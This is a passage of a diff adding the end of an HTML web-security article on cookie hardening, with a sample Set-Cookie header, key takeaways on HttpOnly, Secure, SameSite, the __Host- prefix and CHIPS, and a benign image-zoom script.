+<pre><code class="language-http">Set-Cookie: __Host-widget_session=&lt;opaque-random-value&gt;; Secure; HttpOnly; SameSite=None; Path=/; Partitioned
+</code></pre>
+<p>The key message:</p>
+<blockquote>
+<p>Cookie security is about controlling three things: who can read the cookie, where it is sent, and which hosts can set or override it. <code>HttpOnly</code> reduces token theft from XSS, <code>Secure</code> protects transport, <code>SameSite</code> reduces CSRF, <code>__Host-</code> reduces subdomain cookie injection, and CHIPS reduces cross-site tracking while preserving embedded use cases. At large scale, these controls must be enforced through platform defaults and continuous telemetry, not developer memory.</p>
+</blockquote>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>Cookies are the primary browser credential; their security flags are the first line of defense for session security.</li>
+<li><code>HttpOnly</code> prevents JS from reading cookies; <code>Secure</code> prevents HTTP transmission; <code>SameSite</code> restricts cross-site sending.</li>
+<li><code>SameSite=Lax</code> is the modern browser default and prevents most CSRF patterns; <code>Strict</code> is stronger but may break OAuth flows.</li>
+<li>Use <code>__Host-</code> prefix for maximum cookie security: forces <code>Secure</code>, no <code>Domain</code>, <code>Path=/</code>.</li>
+<li>Never store sensitive tokens in <code>localStorage</code> or <code>sessionStorage</code> — they are accessible to any JS on the page.</li>
+<li>Cookie scope (<code>Domain</code> attribute) should be as narrow as possible; omitting <code>Domain</code> scopes to exact host only.</li>
+</ul>
+
+  <!-- ── Image zoom overlay ───────────────────────────── -->
+  <div id="img-zoom-overlay">
+    <div id="img-zoom-wrap">
+      <img id="img-zoom-el" src="" alt="">
+    </div>
+    <div id="img-zoom-controls">
+      <button id="zoom-out-btn"  title="Zoom out (scroll down / minus)">&#8722;</button>
+      <span   id="img-zoom-level">100%</span>
+      <button id="zoom-in-btn"   title="Zoom in (scroll up / plus)">&#43;</button>
+      <button id="zoom-reset-btn" title="Reset (key: 0)">&#8635;</button>
+    </div>
+    <button id="img-zoom-close" title="Close (Esc)">&#10005;</button>
+    <span   id="img-zoom-hint">Scroll to zoom &nbsp;·&nbsp; Drag to pan &nbsp;·&nbsp; Esc to close</span>
+  </div>
+
+  <script>
+  (function () {
+    var overlay   = document.getElementById('img-zoom-overlay');
+    var wrap      = document.getElementById('img-zoom-wrap');
+    var zoomEl    = document.getElementById('img-zoom-el');
+    var levelEl   = document.getElementById('img-zoom-level');
+    var closeBtn  = document.getElementById('img-zoom-close');
+    var btnIn     = document.getElementById('zoom-in-btn');
+    var btnOut    = document.getElementById('zoom-out-btn');
+    var btnReset  = document.getElementById('zoom-reset-btn');
+
+    var scale = 1, tx = 0, ty = 0;
+    var MIN = 0.15, MAX = 12, STEP = 0.2;
+
+    function applyTransform() {
+      zoomEl.style.transform =
+        'translate(' + tx + 'px,' + ty + 'px) scale(' + scale + ')';
+      levelEl.textContent = Math.round(scale * 100) + '%';
+    }
+
+    function openOverlay(src, alt) {
+      zoomEl.src = src;
+      zoomEl.alt = alt || '';
+      scale = 1; tx = 0; ty = 0;
+      applyTransform();
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeOverlay() {
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+      zoomEl.src = '';
+    }
+
+    // Wire click on every page image.
+    // Uses closest('a') so anchor wrappers at ANY ancestor depth are caught.
+    // Standalone images (no ancestor <a>) get the listener on the <img> itself.
+    document.querySelectorAll('img:not(#img-zoom-el)').forEach(function (img) {
+      var anchor = img.closest('a');
+      if (anchor) {
+        anchor.style.cursor = 'zoom-in';
+        anchor.addEventListener('click', function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      } else {
+        img.style.cursor = 'zoom-in';
+        img.addEventListener('click', function (e) {
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      }
+    });
+
+    closeBtn.addEventListener('click', closeOverlay);
+    overlay.addEventListener('click', function (e) {
+      if (e.target === overlay || e.target === wrap) closeOverlay();
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (!overlay.classList.contains('active')) return;
+      if (e.key === 'Escape') { closeOverlay(); return; }
+      if (e.key === '+' || e.key === '=') { scale = Math.min(MAX, scale + STEP); applyTransform(); }
+      if (e.key === '-')                  { scale = Math.max(MIN, scale - STEP); applyTransform(); }
+      if (e.key === '0')                  { scale = 1; tx = 0; ty = 0; applyTransform(); }
+    });
+
+    btnIn.addEventListener('click',    function () { scale = Math.min(MAX, scale + STEP); applyTransform(); });
+    btnOut.addEventListener('click',   function () { scale = Math.max(MIN, scale - STEP); applyTransform(); });
+    btnReset.addEventListener('click', function () { scale = 1; tx = 0; ty = 0; applyTransform(); });
+
+    // Scroll-wheel zoom (zoom towards cursor)
+    wrap.addEventListener('wheel', function (e) {
+      e.preventDefault();
+      var rect  = wrap.getBoundingClientRect();
+      var cx    = e.clientX - rect.left  - rect.width  / 2;
+      var cy    = e.clientY - rect.top   - rect.height / 2;
+      var delta = e.deltaY < 0 ? STEP : -STEP;
+      var newScale = Math.min(MAX, Math.max(MIN, scale + delta));
+      var ratio    = newScale / scale;
+      tx = cx + ratio * (tx - cx);
+      ty = cy + ratio * (ty - cy);
+      scale = newScale;
+      applyTransform();
+    }, { passive: false });
+
+    // Mouse drag to pan
+    var dragging = false, dsx = 0, dsy = 0, stx = 0, sty = 0;
+    wrap.addEventListener('mousedown', function (e) {
+      dragging = true; wrap.classList.add('dragging');
+      dsx = e.clientX; dsy = e.clientY;
+      stx = tx;        sty = ty;
+      e.preventDefault();
+    });
+    document.addEventListener('mousemove', function (e) {
+      if (!dragging) return;
+      tx = stx + (e.clientX - dsx);
+      ty = sty + (e.clientY - dsy);
+      applyTransform();
+    });
+    document.addEventListener('mouseup', function () {
+      if (dragging) { dragging = false; wrap.classList.remove('dragging'); }
+    });
+
+    // Touch: pinch-to-zoom + single-finger pan
+    var lastDist = 0, pinchStartScale = 1;
+    wrap.addEventListener('touchstart', function (e) {
+      if (e.touches.length === 2) {
+        var dx = e.touches[0].clientX - e.touches[1].clientX;
+        var dy = e.touches[0].clientY - e.touches[1].clientY;
+        lastDist = Math.hypot(dx, dy);
+        pinchStartScale = scale;
+      } else if (e.touches.length === 1) {
+        dragging = true;
+        dsx = e.touches[0].clientX; dsy = e.touches[0].clientY;
+        stx = tx; sty = ty;
+      }
+    }, { passive: true });
+    wrap.addEventListener('touchmove', function (e) {
+      if (e.touches.length === 2) {
+        e.preventDefault();
+        var dx   = e.touches[0].clientX - e.touches[1].clientX;
+        var dy   = e.touches[0].clientY - e.touches[1].clientY;
+        var dist = Math.hypot(dx, dy);
+        scale = Math.min(MAX, Math.max(MIN, pinchStartScale * (dist / lastDist)));
+        applyTransform();
+      } else if (e.touches.length === 1 && dragging) {
+        tx = stx + (e.touches[0].clientX - dsx);
+        ty = sty + (e.touches[0].clientY - dsy);
+        applyTransform();
+      }
+    }, { passive: false });
+    wrap.addEventListener('touchend', function () { dragging = false; });
+  })();
+  </script>
+</body>
+</html>
